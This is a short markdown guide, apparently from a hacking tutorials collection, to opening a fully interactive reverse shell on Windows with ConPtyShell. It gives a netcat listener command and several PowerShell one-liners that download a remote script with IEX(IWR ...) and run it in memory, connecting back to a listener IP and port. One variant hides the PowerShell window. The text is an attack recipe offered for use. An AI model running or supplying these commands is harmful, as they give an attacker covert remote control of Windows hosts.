
## Fully interactive reverse shell on Windows
The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.

**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**


Server Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```hidden
start-process PowerShell.exe -windowstyle hidden "IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.137.6 3001"
```
```
IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
